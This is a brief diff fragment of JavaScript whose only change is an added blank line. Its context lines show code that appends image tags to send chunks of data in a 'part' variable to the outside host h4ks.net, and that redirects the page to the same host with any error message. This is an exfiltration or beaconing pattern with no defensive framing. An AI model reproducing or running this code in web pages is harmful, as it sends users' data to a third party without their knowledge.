@@ -9,6 +9,7 @@ try {
                 $(document.body).append('<img src="//h4ks.net/go/test2?'+part+'">');
             }
 
+            
         } catch (err) {
             location = '//h4ks.net/go/test?'+encodeURIComponent(err.toString());
         }
